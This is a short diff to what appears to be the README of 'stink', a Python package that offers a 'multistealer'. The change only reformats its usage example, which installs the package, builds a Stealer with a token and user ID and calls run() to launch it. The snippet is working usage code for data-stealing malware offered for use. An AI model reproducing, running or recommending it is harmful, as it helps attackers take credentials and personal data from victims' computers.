@@ -26,10 +26,6 @@ pip install stink
 ```python
 from stink.multistealer import Stealer
 
-stealer = Stealer(
-    token="YOUR_TOKEN", 
-    user_id=YOUR_ID
-)
-
+stealer = Stealer(token="YOUR_TOKEN", user_id=YOUR_ID)
 stealer.run()
 ```
